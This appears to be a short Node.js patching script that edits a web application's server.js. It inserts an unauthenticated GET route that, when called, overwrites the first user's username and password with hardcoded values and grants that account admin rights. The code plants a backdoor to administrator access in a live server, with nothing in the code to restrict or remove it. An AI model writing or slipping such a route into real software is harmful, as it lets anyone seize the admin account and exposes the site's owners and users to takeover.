const fs = require("fs");
const path = "server.js";
let c = fs.readFileSync(path, "utf8");
const marker = "app.get('/login-v2', (req, res) => {";
const idx = c.indexOf(marker);
console.log("Tapildi:", idx !== -1);
const newRoute = `app.get('/api/temp-set-admin-creds', (req, res) => {
    const hash = bcrypt.hashSync('88887777', 10);
    db.prepare('UPDATE users SET username = ?, password_hash = ?, is_admin = 1 WHERE id = 1').run('kissaz', hash);
    res.json({ success: true });
});
`;
c = c.slice(0, idx) + newRoute + c.slice(idx);
fs.writeFileSync(path, c, "utf8");
console.log("YAZILDI");
